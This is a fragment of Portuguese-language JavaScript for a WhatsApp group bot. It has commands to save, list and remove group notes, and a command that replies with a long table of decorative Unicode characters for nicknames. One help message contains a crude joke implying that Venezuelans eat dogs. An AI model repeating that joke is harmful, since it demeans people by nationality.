blity = `- ⏰ Horário que criou a Tabela : ${tabelagpofc.Horario}\n\n- 🗓️ Data que criou a Tabela : ${tabelagpofc.Data}\n\n - Tabela : ${tabelagpofc.Tabela}`

nezuko.sendMessage(from, {text: blity}, {quoted: info})
break

case 'anotar':
case 'tirar_nota':
case 'rmnota':
if(!isGroup) return reply(mess.only.group)
if(!isGroupAdmins) return reply(mess.only.admin)
if(command == "anotar") {
var [q5, q10] = q.trim().split("|")
if(!q5 || !q10 || !q.includes("|")) return reply(`Digite o título da anotação e o texto que deseja anotar..\nExemplo: ${prefix}anotar cachorro|Cachorros são bom pra comer na Venezuela...`)
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q5)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q5)  
if(anotar[i2].puxar[i3].nota == q5) return reply(`Esta anotação já está inclusa, utilize outro título.. Ou você pode tirar com\n${prefix}tirar_nota ${q5}`)
}
}
if(!JSON.stringify(anotar).includes(from)) {
anotar.push({grupo: from, puxar: [{nota: q5, anotacao: q10}]})
fs.writeFileSync("./func/tabela/anotar.json", JSON.stringify(anotar))
reply("Anotação registrada com sucesso...")
} else {
anotar[i2].puxar.push({nota: q5, anotacao: q10})
fs.writeFileSync("./func/tabela/anotar.json", JSON.stringify(anotar))
reply("Anotação registrada com sucesso...")  
}
} else {
if(!q) return reply("Digite qual anotação deseja tirar pelo título..")
if(JSON.stringify(anotar).includes(from)) {  
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(JSON.stringify(anotar[i2].puxar).includes(q)) {
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
}
}
if(0 > anotar[i2].puxar.map(i => i.nota).indexOf(q)) return reply("Esta nota não está inclusa, verifique com atenção...")
anotar[i2].puxar.splice(i3, 1)
fs.writeFileSync("./func/tabela/anotar.json", JSON.stringify(anotar))
reply(`Anotação ${q} tirada com sucesso...`)
}
break

case 'anotacao':
case 'anotacoes':  
case 'nota':
case 'notas':
if(!isGroup) return reply(mess.only.group)
if(command == "anotacao" || command == "nota") {
if(!q) return reply("Digite o título da anotação que deseja puxar..")
if(!JSON.stringify(anotar).includes(from)) return reply("Este grupo não tem nenhuma anotação...")
var i2 = anotar.map(i => i.grupo).indexOf(from)  
if(!JSON.stringify(anotar[i2].puxar).includes(q)) return reply("Não contém nenhuma anotação com este título.")
var i3 = anotar[i2].puxar.map(i => i.nota).indexOf(q)  
mention(`〈 ${anotar[i2].puxar[i3].anotacao} 〉`)
} else {
var i2 = anotar.map(i => i.grupo).indexOf(from)    
if(anotar[i2].puxar.length == 0) return reply("Este grupo não tem nenhuma anotação...")    
var i2 = anotar.map(i => i.grupo).indexOf(from) 
var antr = anotar[i2].puxar 
txtin = "──────────────────\n\n"
for ( i = 0; i < antr.length; i++) {
txtin += `↝ Anotação: ⟮ ${anotar[i2].puxar[i].nota} ⟯ - 〈 ${anotar[i2].puxar[i].anotacao} 〉\n\n`
}
txtin += "──────────────────\n\n"
mention(txtin)
}
break

case 'tabela':
reply(`
𝐓𝐀𝐁𝐄𝐋𝐀 𝐁𝐘: ◈ 月⃟亮 ☾٭ 𝙉𝙚𝙯𝙪𝙠𝙤 𝙗𝙤𝙩 𝙈𝘿


𝐓𝐀𝐁𝐄𝐋𝐀 𝐃𝐄 𝐋𝐄𝐓𝐑𝐀𝐒 🌀
𝛢 𝛥 𝛬  𝜜 𝜟 𝜵 𝐴 𝐀 𝑨 𝙰 卂 么 入 刄 公
B 𝛣 𝚩 𝜝 𝐵 ℬ 𝓑 𝕭 乃 岌 多仍 
C 𝐂 𝑪 𝐶 𝓒  𝕮 匚 ር ℂ
D𝐃   𝑫 𝐷 𝓓 ᗪ 𝕯 
E 玄 𝐄 𝑬 𝐸 𝚬 𝚵 𝛴 𝛯 𝜮 𝜩 ℰ 乇 ꏂ 
F 𝐅 𝑭 𝐹 ℱ 𝕱 𝔉 千 
G 𝐆 𝑮 𝐺 Ꮹ                     
H 𝐇 𝑯 𝐻 ℋ ℌ 卄 ꫝ ዘ   
I 𝙸 𝕚 𝐈 𝑰 𝐼 𝔦 𝓲 | ቾ
J 𝔍 𝐉 𝑱 𝐽 𝒥  𝓳       
K 𝐊 𝑲 𝐾 𝚱 𝛫 𝜥 𝒦 
L 𝐋 𝑳 𝐿 ℒ 𝕷 ꪶ ㄥ廴
M 𝐌 𝑴 𝑀 ℳ ᗰ 𝕸 𝔐 ꪑ 爪 𝛭
N 𝐍 𝑵 𝑁 𝓝 ꪀ 𝚴 𝚴 ᜰ ꤾ ꡃ
O 𝐎 𝑶 𝑂𝒪 ꪮ ㄖ 𝚯 𝚶 𝛳 𝛩 𝛷 ❍ 〄
P 𝐏 𝑷 𝑃 𝙿 ℙ 𝕻 𝔓卩 𝛲 𝜬
Q 𝐐 𝑸 𝑄 𝕼 Ҩ
R  𝐑 𝑹 𝑅 ℛ ℜ 𝕽 尺     
S 𝐒 𝑺 𝑆 丂 令
T  𝑻 𝑇 ㄒፕ 𝚻 𝛵 亇
U 𝐔 𝑼 𝑈𝒰  ᑌ 𝔘 𝖀 ꪊ ㄩび
V  𝑽 𝑉 𝒱  ꪜ 𝛶 𝜰
W 𝐖 𝑾 𝑊 ᗯ ᭙ 山 ሠ 𝜔 Ꮤ ꪡ ꪝ ꤿ
X 𝕏 𝐗 𝑿 𝑋 𝒳  ᥊ 乂 ꉧ 𝛸 𝜲 ꪎ
Y 𝐘 𝕐 𝒀 𝑌 ꪗ ㄚ ሃ 𝜳 

INÍCIOS🌀
ৡৢ͜͡   ঔৣ͜͡   ᬊ͜͡    ೈ፝͜͡   ꯴᩠ꦽꦼ  ░⃟⃛ ➮ ⏤͟͟͞͞ 

FIM PARA NICK🌀
݈݇─  ͜〉⛧ ᭄ ⸸ ᭄ 𖤐⁩᭄ꦿ ᬏ᭄ ⛤⃗͜ᬏ᭄   

𝐒𝐈𝐌𝐁𝐎𝐋𝐎𝐒 🌀
     ⃟        ⃤     ⃝      ᬽ ۝ ⛧ ᪤ ⸸ ᬛ ᭆ ᭩ །  ᬽ
     ⃢        ⚚ ♕ ♔ ⛥ ᭟  ֎ ◌ ⚝ ⅌ 𝆮 ۞ ༒ ༆ ༅ ༄ ༃ ༀ ༁ ༺ ༻ ࿐ ࿘ ࿕ ࿖ ࿗ ࿔ ࿓ ࿒ ࿑ ࿋ ࿉ ࿄  ࿅࿆  ░ ▒ ▓  ◍   ▸ ▹ ▿ ▾ ▵ ▴ ◊ ◔ ◕ ◖ ◗☙  ☥ ☤  ☻ ☼ ☽ ☾ ☿  ♁ ♃ ♘ ♡ ♞ ♱ ♰  ⚶ ✢ ✤  ✔ ✕ ✗ ✘ ✰ ❀ ❁ ❃ ✻  ✵ ✯ ✭ ✧ ✦ ❍ ❐ ❑  ❒  ❏ ⸙ ⸎ ꧁ ꧂ シ ツ ﭢ ღ ✞ ✟ ༈ ✄ ⊱ ⊰  இ ༎ 🝐 🝳 🝲 🜊 🜋 🜌 🜏 🜎 🜘 🜚 🜛 🜜 🜥 🜞 🜟 🜢 ᭁ 𝀶  ᬽ ᭪ ᭦ ᭝ ᭕ ᭘ ᬊ ᬉ ᬏ  ᬇ ᬠ ᬨ  ᭄ ❦ ⦚ ⧛ ⧚ ⿰ ⿱ ⿴ ⿻ 〄 々〆 〃 〮     ҈      ҉   ೠ ಝ ಋ ಊ ౾ ౠ ෴ ๛ ༗ ༖ ༕ 卐 ㌌   ͢   𝁮 𝀑 

𝐈𝐍𝐈𝐂𝐈𝐎𝐒 𝐏𝐀𝐑𝐀 𝐍𝐈𝐂𝐊 🌀 

ᬊ͜͡   ঔৣ͜͡   ⏤͟͟͞͞🌻  𖥨֗  ೈ፝͜͡    🌾⃟ꦿ⸼  ✧͜͡҉    ঔৣ͜͡➳ ꧁͜͡    ৎ❥̤֟٭ۣۜ   ৡৢ͜͡    ঔৣ͜͡҉❅ۣ̤ۜ   ⿻ꦿꦂ  ❥ꦿꯧָ   ᭥ꩌ゚໋ ꯴᩠ꦽꦼ   ᭺ᮀฺ۪۟𖡎’￫ ࿂ꦿ๋͚ꪳ↛ ꪶ⚘࿆ꦿི ݈݇   ᥀·࣭࣪̇˖ ᠂࣭. ⃝༘⃕🍒 ✧༷ꦿ݈۟⸼͓۬࣪ꪶ  ནཹꦿ  ❀࿆⃧፝྅⃕ꦿ   ွဳ⃟ꦿ   
🌹፝⃟༘┼ ᜴⃕  ░⃟⃛ ➮ ⿻͜͡   ꪶཷ୭͓ꦿ݉ᐧᨗ  ✞⃟❐͜͡ 

𝐒𝐈𝐌𝐁𝐎𝐋𝐎𝐒 𝐄𝐒𝐓𝐑𝐀𝐍𝐇𝐎𝐒 🌀
𒁂𒀽𒁖𒁯𒁮𒂄𒂷𒇲𒈝𒈞𒈟𒈩𒉂𒉁𒈑𒈒𒉫𒉜𒉴𒉰𒊊𒊋𒊓𒊫𒊺𒊻𒊼𒊽𒋦𒋨𒌄𒌃𒌅𒌜𒌢𒌵𒍥𒍤𒍣𒍓𒍟𒐦𒐪𒑓𒊹𒇫𒇋𒆖𒆕𒄬 

𝐒𝐈𝐌𝐁𝐎𝐋𝐎𝐒 𝐄𝐆𝐈𝐏𝐂𝐈𝐎𝐒 🌀
𓁹𓁺𓁻𓁼𓁽𓁾𓁿𓂔𓂓𓂛𓂜𓂞𓂠𓂢𓂣𓂤𓁵𓁴𓁤𓁜𓁳𓁣𓁪𓁢𓁱𓁡𓁑𓁊𓁍𓁎𓁌𓂓𓂑𓃚𓃙𓃚𓃛𓃜𓃝𓃟𓃟𓃨𓃪𓃬𓃭𓃸𓃶𓃾𓅉𓅂𓅄𓅆𓅙𓅓𓅌𓅖𓅗𓅢𓅱𓅪𓅭𓅮𓆈𓆂𓆅𓆔𓆖𓆖𓆠𓆛𓆜𓆞𓆞𓆣𓆤𓆦𓆟𓆺𓆳𓆵𓆶𓇈𓇓𓇒𓇥𓇣𓇭𓉡𓉢𓉦𓉦𓉸𓉻𓉔𓊢𓊞𓊭𓋐𓋖𓋸𓌆𓌱𓌺𓍙𓍢𓏱𓏲𓏵𓏠𓏤𓏑𓏎𓂸 

𝐃𝐄𝐂𝐎𝐑𝐀𝐂𝐎𝐄𝐒 🌀
❒᭄꥓〭🌹 ᠂࣭. ⃝༘⃕🍒 ⸵░⃟🌻𖥨ํ∘̥⃟⸽⃟🌹 ｡˚༷🌸｡˚༷￫ 🌙ꪾ〬ꩌ۪٬ླྀ  ❑ꦽꦷ🌻⏤͟͟͞͞🍹⁖ฺ۟̇࣪·֗٬̤⃟🌸 

𝐒𝐈𝐌𝐁𝐎𝐋𝐎𝐒  𝐂𝐇𝐈𝐍𝐄𝐒𝐄𝐒🌀
㌀ ㌁ ㌂ ㌄ ㌇ ㌚ ㍃ ㍈ ㍖ ㌭ ㌡ ㌠ ㌙ ボ テ ス ツ ガ カ オ ぼ ⽔ ⽃ ⼪ ⼢ ⼒ ⻰ ㋒ ㋚ ㋔ ㋛ ㋘ ㋠ ㋡㐌 㐈 㐲 㐳 㑂 㑄 㐱 㒊 㑱 㓛 㓘 㓗 㓆㕣 㕚 㕛 㘪 㘦 㘶 㠫 㡍 㡴 㡲 㡰 㡱 㣊 㣍 㣻 丈 丕 

Outros símbolos🌀
ϟ ↯ ⛧ ⸸  ♞  ♘  ࿗  ࿕  ⛥  ツ  シ  ♰  ♱  卐 ✟  ✞ 

Símbolos pra colocar no meio do nick🌀
    ⃢          ⃤   ⃟       ⃝     - SETAS -    ͢         ⃮          ⃖       ⃯         ͍ ↠ ↡ ↢ ↚ ↛ ↜ ↝ ↞ ↟ ↣↤↥↦↧↰↱↲↳↴↵↶↷↸↹↺↻↼↽↾↿⇀⇁⇂⇃⇄⇅⇆⇇⇈⇉⇊⇋⇌⇍⇎⇏⇐⇑⇒⇓⇔⇖⇕⇗⇘⇙⇚⇛⇜⇝⇞⇟⇠⇡⇢⇣⇤⇥⇦⇧⇨⇩⇪⇫⇬⇭⇮⇯⇰⇱⇲⇳⇴⇵⇶⇷⇸⇹⇺⇻⇼⇽⇾⇿ 

COISAS PRA BOTAR NO INÍCIO E FIM DO NOME
〈〉  《》 「」『』【】〔〕〖〗〘〙〚〛⟬⟭ ⟦⟧ ⟨⟩ ⟪⟫ ⟮⟯ 

NÚMEROS🌀
➊ ➋ ➌ ➍ ➎ ➏ ➐ ➑ ➒ ⓿
𝟏 𝟐 𝟑 𝟒 𝟓 𝟔 𝟕 𝟖 𝟗 𝟎 

ᱹ▻      ҂͓꣣۫۫🍉۫ꢁ     ᯢ❁⃪ ◗     ░⃟⃛🍎༘݊➮ 

꒰১°᳝ꯥ‧ٓ➭    ꒰ෑ᪲꒱     ░ෆෑ    ❒᭄꥓〭🍌   ᠂⸱ེ̀.𖧷 

  ᩠░⃟⃜🍏ꪳ۫₎۬۟〬      ᭥ꩌ゚໋ ꯴̸᩠🍩⭛      ❀࿆⃧፝྅⃕ꦿ      〭〭〬〬⿻❥〬〬〬ꦿ[ 

  ᩠ ꣣ʹ͚🍣     𖦹҉ २꫶   ╰៚݈݇      ⸵░⃟🐛̸꙰     ᱸᱹ𖠳𖣻 

᭥ꩌ゚໋ ꯴᩠ꦽꦼ💌↦     ꔛ⃟⿻⃕⸵ࣻ꒰🍉꒱   ❨᯽ᨘ‛᩠⋆ꣻ     𖨮𖡎｡ 

㇀🐿 ۬.͜˖-    ⸾〬۝ꦿ҂⃨     ཷ꒱⸼   🌙ꪾ〬ꩌ۪٬ླྀ   ▩݅͜𖨌•.̇ 

᭥ꩌ゚໋ ꯴̸᩠🍩⭛      '꩖࿆͜͡𖡜•↣    ∎🚀    ࿂ꦿ๋͚ꪳ↛ 

  ᠌᠍᠍᠌᠎᠋᠎᠎ᤧᱸᱹ༊↯🍄       ᠌᠍᠍᠌᠎᠋᠎᠎ᤧᱸᱹ༊⇝     ꔷ㆒⸼݇҉ֻ᠂⃟🍉    ╰꫶ ࿉۟࣪࣪᭝ 

ꔛ⃟⿻ྀ⃕🍒           ⃝༘⃕🍒´݈       ᠂࣭.   ⃝༘⃕🍒↳    🎐·۪۫ˑ݈↷ 

᥀───🍰ٜᩦ୭     ꒰───🍰·ٜ۬･     🎡⿻ꦿꪳ։ 

🍩ꪶཷ୭͓ꦿ݉ᐧᨗ      ✧༷ꦿ݈۟⸼͓۬࣪ꪶ🌹     🍧.ᩦ୭✧ࣶᭂ     𖠵꩜⭟ 

╶ 🦔 ❪❥ꦿꯧָ❫      •.̇𖥨֗🍓⭟       ๋𖡜 ݈݈-݇     ─ ࿊⃨१ 

❥.ᨘ۫.ꪶ         .ᨘ۫.ꪶ🍧 ۪→      ᭥⃕꙰҉ ◍̤￫ 🌹࣭࣭◗   ❪🍑ꦿེ≭•۟.❫      ❪🛸ꦿꯧ⸼❫    𖣠ᮬ·̣̇꧈    ꪶ⚘࿆ꦿི ݈݇- 

𖧹⸻𖠚ꪴ۟〬  ╶ 🦔 ❪❥ꦿꯧָ❫      ❪̣࣭̇࣪·ฺ۪۟𖡎｡     𖣠ᮬ·̣̇͜᭺ 

⁖ฺ۟̇࣪·֗٬̤⃟🌻        ░░۟⃟🌻༘⸻       ·᳝∴̣࣭🌻·᳝∴̣࣭ 

⸻⿻ꦿꯧ๛    •.̇𖠵⃯🍧    ‡𖧱১   ᥀·࣭࣪̇˖💌◗ 

❪°·ꯥ̣ꩍ🍉↣    ๛ᤢ᪴🍑↯     ꪖ⚘⃯     𖠵⃕⁖      ❑ꦽꦷ꧈ 

────🛸°·ꯥ̣ꩍ    ─────̥˚᳝᳝𖥻🍧̇⸱ 

ꓻ┼       ꦽꦽꦼ➮     ꦽꦽꦶ꧈     ຊ✏     ❀ꦿ꩟ 

───𖡜̸｡᭭        ꫶─────୬۟◍⭟      ꨴ◍⸱￫ 

▩⃕͜ꦿ૰￫     ‡ᮀ১🌹；    ᭥ꙮ•̇‡ꪳ͢⠂ᨗ    🍓ꦽ᪱ꩍ 

᳝'꩖͜͡•꙰─»     ───𖡜ꦽ̸ོ˚￫     ▩⃪ꦽꦶ̸꧇      ᭺ᮀฺ۪۟𖡎’￫    

  ꓸ᭄ꦿ⃔⸙        ⿻ꦿꦂ🍑       ░༵۟🍉ֻ͛➜       ⎝❑⃕ཷ🍟 

‹‹❑ౄ🍒    ླ🍑❜︧༷︧➭    ꪶ🍄 ⃦⭛     ❍⃕⃟᎒⃟̀🍬ི૪ 

｡˚༷ᮀ｡˚༷￫     ｡˚༷｡˚༷🍒➮   ꓻ┼ꦽ᪱ꩍ🦔꧈    ⚘๋࿆.•۟ 

۝     ❪.🚀᪽̩¡❫     ๛·࣭̣࣪̇⸱🍩◗     ❒𖥻ꦼꦽ➮   

ꕥꦿོ꧈    ───ཹ🌹 ݇-݈    ❪১°᳝ꯥ‧ٓ↵❫      ১°᳝ꯥ‧ٓ🛸 

꒰🍒১°᳝ꯥ‧ٓ⭝       ꦽꦁ১︧.۪̇〬°⃟᮪݇⃟⃟🍧       ⃦ꦦꪳ՚𖦹       ⃦ꦦꪳ՚☕   

◖🍑ནཹꦿ◗    ◖🍒ནཹꦿ↣    𖣠’᪵১↣     ᳝'꩖͜͡𖧷𖦝    

────𖦹५ॱ     ᳝'꩖͜͡ꦿꦼ🍣     ◍ཻꢀ᮪⸱ᨗᨗᨗ🛸     ◍ཻꢀ🌹૰ 

惢🍑҂       惢🍉’݆￫     🌹ꦽꦼ̷১      ’٬࿊⃟☽ᝦ    

ꛒ੭〭۬🍒ᨘ₎      ᨆᨘ᭲.˚🍓྆≭     ◦ᮀᨘ۬․ٰ৴🍚੭      🍉⃟᮪〭۬̇〬⃟˖ꪶ    

᳝'꩖͜͡⚘࿆ํ·ٜꪶ      ⚘࿆꯴˖࣭̣᪽̇ ๋──       ꫶ ⃙◌⃙◍     ❪̣࣭̇࣪·ฺ۪۟࿃❫̣࣭̇࣪·ฺ۪۟ 

🍒 ⃟᮪〭۬̇〬⃟˖⸱ೇ    🌺ꦽꦼ̷•ˑ˒     🥥ꦽꦼ̷ꪶ     𖥕𖠗∙۟ᱹ۫↻ 

﹎૰ཾ⋅ꩌꦿ🍧｡        ❪𖦄͟𖦉̤۪᭮.↣         ៍ོ⃨̇𖦖🍑⭟     

✎․ೇ︨︧ཾ✾▹     𖤃·۪۫ˑ݈↷      ⸻⌔☐❜｡۪۪۫۫↛ 

｟𖠲۪۫ᮀ〭⑇⃨᪽᪴｠ ╰ํ⃝̸〭∙۬·𖤃    ❪🍧ฺ࣭࣪͘ꕸ▸    𖥨ํ∘̥⃟⸽⃟💌৴▸ 

𖥨ํ∘̥⃟⸽⃟🎐㇀      🌵ฺ࣭࣪͘◞,〬⎼      ꗏฺ࣭̇͘.㇀🍣      ─◍᳝࣪.⋕𖥾ᤢ۪.۫ 

▧⃯⃟৴ํฺ͘.•🍣”     ▧⃯⃟৴ํฺ͘.•🛸 ݈݇─     ▧⃟╳⃟ೇ̖ 


就像模像ા િ ી ુ ૂ ૃ ૄ ૅ ે ૈ ૉ ₡₢₣₤₥₦₩₪₫₭₯₾₽₻₺₸₷₶₶₵₴₴₲₰₱₳⸿⸚⸛ⶬ⻞⸙ㆃ㑹䡤 ▒░▓ ҉ ҈ ℳℴℵ℥ℤℨ℘ℜ
♔♕♖♖♗♘♚♝♟♠♢♢♣♤♦♨⚀⚂⚃⚅❧❥❥❤❣❠❠❑❒❁❃❅❔❔❖❆❇❈❙❙❋❜❝❞❏❎❍❌❊❊❉❈❇❅❄❂❀❀✰✱✳✳✴✵✷✷✸✹✺✻✼✽✿✯✮✫✫✪✧✦✥✤✤✣✢✡✡✠✟✞✜✛✚✙✘✘✖✖✗✕✔✓✒✑✍✎✏ ೈ፝͜͡࿇ ঔৣ͜͡➳ ⇝❦ۜ✯ۣۜৡৡۣۜ✯ۜ❦⇜꧁᭼⸼✞⸼᭼꧂ ঔৣ͜͡ீ͜❥͜ঔৣ👼 ⸎✴•เั•✴⸎ ঔৣ͜͡➳ೈ፝͜͡࿇↭ৢۜ͜͡✟✙✚✛✠✟✞✜✢✦✧꧁ᵗᶤᵃ ᵇᵘᶰᶰʸ꧂ ✦✮✭✬✫✪✩✯✰✺✹✸✷✶✵❂❧❦ ⇝❦ۜ✯ۣۜৡৡۣۜ✯ۜ❦⇜꧁᭼⸼✞⸼᭼꧂ঔৣ͜͡ீ͜❥͜ঔৣ👼 ⸎✴•เั•✴⸎🔴⚪⚫
๖ۣۜۜ͜͡ ۣۜ   ஓீ͜ ፝͡ৎ✞̤֟٭  ৎ❥̤֟٭  ৎ̤✙֟٭  ஓீۣ̤֟͜٭̤֟ ঔ  ፝͡ৎ   ፝͡ৎ✞̤֟٭  ⸎✞ 

  ৎ❥̤֟٭ۣۜ ஓீ፝͜͡   ✦ۣۜۜ☆ۣۜۜ͜͡   ঔৣֳ᷌᷈͜͡❀ ్మాై  ू ፝͜❥ ೈ፝͜͡๖ۣۜ   ৎ✿̤֟٭ ೈ፝ 

✦҈͜͡➳ ீ͜ৡৢ͜͡   ๖ۣۜۜ͜͡ீ͜   ೈ፝͜͡    ঔৣ͜͡   ৢۜ͜͡✟ ঔৣ͜͡ீ͜❥͜ঔৣ
ᢁ♾႘႙လၼဏ☍ᨖ∾⏦∞ზ⚪⚫⚬⭕🔴🔵๏༚ᢀᨔ⌻⌼⌽⌾⍉⍛⍜⎉⎊⎋⏀⏁⏂⏣◉○◌◍◎●◐◑◒◓◔◕◦◯◴◵◶◷☌⚭⚮⚯⛢❍⬤⬮⬯⭖⭗⭘⭙〄ʘஃ་჻᎒᎓᠁᠂᠃᠅᨞⁕⁑⁂⁖⁘⁙․‥…‧⁚⁛⁜⁝⁞※┄┅┆┇┈┉┊┋⛬⌗⌸⌹⍁⍂⍃⍄⍞⍯⎕⏍⏥▀▁▂▃▄▅▆▇█▉▊▋▌▍▎▏▐░▒▓▕▖▗▘▙▚▛▜▝▞▟■□▢▣▤▥▦▧▨▩▪▫▬▭▮▯▰▱◘◙◧◨◩◪◫◰◱◲◳◻◼◽◾⚼⛝⛞❏❐❑❒❘❙❚⬚⬛⬜🔲🔳⌧❖⌺⍋⍍⍒⍔⍙⍚⎏⎐⎑⎒⏃⏄⏅▲△▴▵▶▷▸▹►▻▼▽▾▿◀◁◂◃◄◅◆◇◈◊◢◣◤◥◬◭◮◸◹◺◿⛋⛛⛡⟐🔶🔷🔸🔹🔺🔻🔼🔽இ༓࿉།༎ᔗᔘᔚᔙᓬᕫᕬᕭᕮᖗᖘᖙᖚᖰᖱᖲᖳᖼᖽᖾᖿᗤᗥᗦᗧᗡᗠᗢᗣᗞᗟᗜᗝᗘᗛᗗᗖᗐᗑᗒᗕᘜᘝᘞᘛᘮᘯᘰᘳᙀᙁᙂᙅᙈᙉᙊᙍᙷᙸᙼᙺᨀᨁᨂᨃᨄᨅᨇᨋᨌᨍᨎᨏ᨟ᨐᨑᨒᨓᨕᱤᱥᱦᱧᱨᱩᱫᱬᱭᱮᱯᱰᱵᱜᱝ⌌⌍⌎⌏⌜⌝⌞⌟⌓⌔⌖⌘⌬⍊⍌⍎⍑⍓⍕⍝⍭⍱⍲⎄⎅⎆⎇⎈⎌⎍⎎⍽⍾⎓⎔⎗⎘⏆⏇⏈⏉⏊⏋⏌─━│┃┌┍┎┏┐┑┒┓└┕┖┗┘┙┚┛├┝┞┟┠┡┢┣┤┥┦┧┨┩┪┫┬┭┮┯┰┱┲┳┴┵┶┷┸┹┺┻┼┽┾┿╀╁╂╃╄╅╆╇╈╉╊╋╌╍╎╏═║╒╓╔╕╖╗╘╙╚╛╜╝╞╟╠╡╢╣╤╥╦╧╨╩╪╫╬╭╮╯╰╱╲╴╵╶╷╸╹╺╻╼╽╾╿◖◗◚◛◜◝◞◟◠◡☰☱☲☳☴☵☶☷⚊⚋⚌⚍⚎⚏⚞⚟⚶⚷⚹⚺⚻⛘⛚⛻彡❡۩ண⌦⌫ਊ〽〰


A=Δ꙰ Λ λ Ⱥ ₳ ą å ส สั ล α ค ศ Ⴉ 🇦 🇦ศ ₳ ﾑΔ a ɑ Ă 厾 λ α Λ ɐ ส丹ⓐ Д ∆ ਸ λ Λ ą å ส ล ค α Ą ਜ Ẵ ศ ά āλ Д Å ä ล Ẳ Ħ ª ẩ ส Ä ձ Ą ๖ۣۜĄ αสั ά ặ
म स 禸 丒丸凡 丹入 ﾑ ム Д 开 ໞ Ѧ 月么 ਜ A҉ 岚 ๖ۣۜA ꬍꬅ 刄 㞩 

B=多🇧 乃 ঔৣ͜͡岌 в ฿ ß β ცⓑ ხ ɮ β ß ฿ Ъ طß в β ხ ฿ в ␢ ๒ Ъ ъ ь Ɓ ß ฿ Þ 乃 邦 ぶ ✇ 及 в Ⴊ 🇧 ๖ۣۜB 夃 ଷ
ゐßѢƀЪЬβϐбБъьわゎらね ♭ ɓ B҉ ㄢ 

C=¢ ₡ ₢ C ς ⊂ 匚 ㄷ ど に 二仁 🇨 ɕ ૮ C҉ ๖ۣۜC Շ 🇨 ¢ ₡ ᄃ c̈̈ ɔ ς ©C¢ ς © ζ Ƈ Ɔ ʗ ₡ ૮ ح¢ Ĉ č Č © ĉ Ć ૮ 

D=ↁ Đ ɗ đ δ ɖ わ 力 ⊅ ⊅໓ 🇩 ∌ D҉ 刀 Ɗ
๖ۣۜD ಖ 🇩đ Đ ɖ ⓓ ∂ ժÐ ∂ đ ۜÐ ₫Ð ∂ ð đ ๔ მ ძ ժ ɗ 

E=Ɇ € ℮ ㉫ ∉ ∈ Ξ Σ ξ Є ๋Є ع ə ɇ є ჲ を
ﾐ ﾓ 三 巨 玄乞 Ｅ它 ೯ ౯ ㄠ モ 🇪 E҉ 亥 ૯ ๖ۣۜE も ƎƏ Ɛ ؏៩ 🇪 乇 Є є Σ ε ξ ⓔ 玄 ៩ ₤ ჰ პ℮£ Є ξ Є๋ є ჱ ŧ Σ ε ع э έ נּ גּ ɛ ə ٤ ૯૯ є პ ε Ë ع ﻊ ē € ξ έ ℮ ë Э ۼ 

F=Ғ ƒ Բ下 ﾁ Ϝ Fヂ Ք F 下 🇫 F҉. ๖ۣۜF  🇫 ｷ ₣ ʃ ғ ⓕ f Ғƒ Բ ๖ۣۜF ₣ƒ ₣ ﬄ ךּ דּ Ғ ક 

G=₲ ǥ Ⴚ Ǥ ❡ ሬ 🇬 Ԍ G҉ ๖ۣۜG ໔ ໕ ផ ௹
🇬 Ĝ Ģ g G̈̈ ⓖ ₲ ௹ ğ G๋ ๔ Ġ ġ ģ ğ๋ ؤ و פĢ ₢ ɠ ૬ ǥ 

H=Ħ ん ɧ 卄௮ அ ஆ Һ һ н Ҕ ҕ Ң ң Ҥҥ Ӈ ӈ Ԋ ԋ 艹 Ⴌ 🇭 ╠╣ H み ђ ๖ۣۜH ਮ 🇭 ん ħ н ђ அ ჩ ħ ╠╣ ђ સ Њ ௮ Ћ нસ அ ħ ђ н Ћ Њ अ╠╣ 

I=፤ ɨ ៛ í ∣ ழェ エ ｪ ｴ 工讠 辶 เ ቾ 🇮 ҉ I҉ 
๖ۣۜI ⶇⷀ 🇮 ί Ξ រ ł ιΐ ι ║ï Î เ Ī ﭑ Ỉ î Į ĩϊ ΐ ذ ﻐ ɩ ւ ɨ 

J=ʝĲ ｊ Ｊ ʲქ ჟ 🇯 J ℑ ๖ۣۜJ 🇯ʝ ქ J Ĵ ɾ ე უل נ ਹ Ĵנ ل Ţ ړ ਹ ﻮ ʝ ჟ 

K=Ҝ Ҟ Ӄ ₭ Ҝ 长 ҟ Ҡ ҡ ӄ ҝ  🇰 Ƙ K ઝ ๖ۣۜK🇰 ₭ Ҝ κ ķ К к ๖ۣۜK ઝ Қ ķ к Ҝ ₭ К қ ҝ 

L=Ł Լ ℓ ∟ ﾚ し ̽ſ ʆ ไ ₰ 🇱よ๊レ 廴 L҉ ㄥ ๖ۣۜL โ Ն ₺ 🇱 Ł ₰ ℓ Լ よ ℓ Ĺ Ł Լ Ľ Ļ Ŀ ┘£ ไŁ ℓ Ļ ๋╝Լ 

M=ℳ ๓ ற м რ ო ɱ ₥ Ӎ ポ ボ /V 水 ണ Ӎ 🇲 M҉ 爪 ๖ۣۜM
🇲 м ℳ რ ற ო ɱ ๓ ʍ დლм ற /V ๓ ๖ۣۜM Щ๓ ற м ₥ რ ო ɱ 

N=₦ Ń ņ ரŋИ ภй מ Ň หฑ иη∩ ல ₪ ൯ Ŋ N҉ れ ๖ۣۜN ฌ ญ ൮ വശഷസ Л🇳и ₦ Π ₪ η ெ வ йи η ŋ ฑ ர И ภ й Ń ņ ή п ห Ŋ ภ Պ ฑ η и ர Ɲ ห ₪ ɳ מּ תּ ₦ 

O=Ѻ θ Θ ❍ ◯ 〇Ծ҉ ゆ ∅ Ø Ծ Օ ס ⊗ ₴ Θ ΦϕФ Ω θ๑ ๏ ο ๐ σ ø ѳ Ѻ Ѳ Ө ०
の 🇴 ۝ O 口 ๖ۣۜO 汩 ଠ 🇴Ø๏σǿ⊕ƠФץםץ₴ΘԾøΩ❍ტიბθ❂ ø σ Ø ૭ Ǿ ö ♂ ợ Ů Ơ Ō Ծ Θ δ Ǿ Ф Ộ Ö ǿ Ŏ ό Ø ѳ ø ૭ σ ๏ ơ Θ Ф ठ ☻☺ θ Ө ɵҨ 

P=℘ ₱ 了 ァ户 ㄕ尸 卩卫 ƿ ρ م թ ｱ ק ¶ や ゃ ア マ ャ ヤ ヹ ｱ  🇵 伊 ҉ P҉ ㄗ ๖ۣۜP 尹 🇵ρ ק թ þ φÞ ╠╝קּ թ φ þ քק Þ ρ P๋ ‽ ρ ƿ ք թ ॐ 

